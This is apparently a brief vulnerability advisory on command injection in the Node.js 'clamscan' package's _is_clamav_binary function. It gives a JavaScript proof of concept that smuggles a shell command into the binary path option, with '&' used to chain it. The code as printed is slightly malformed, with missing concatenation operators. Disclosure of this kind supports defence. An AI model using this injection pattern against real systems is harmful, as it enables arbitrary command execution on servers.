# Overview
`clamscan` is a Use Node JS to scan files on your server with ClamAV's clamscan binary or clamdscan daemon. This is especially useful for scanning uploaded files provided by un-trusted sources.

This package are vulnerable to Command Injection, itt is possible to inject arbitrary commands as part of the `_is_clamav_binary` function located within `Index.js`. 

It should be noted that this vulnerability requires a pre-requisite that a folder should be created with the same command that will be chained to execute, this lowers the risk of this issue. 

# Proof of Concept
```
var Root = require("clamscan");
var fs = require("fs");
var attack_code = "echo vulnerable > create.txt";
var root = new Root();
fs.mkdir(attack_code   "&", function(){});
root.init({"clamscan": {'path': attack_code   "&"}});
```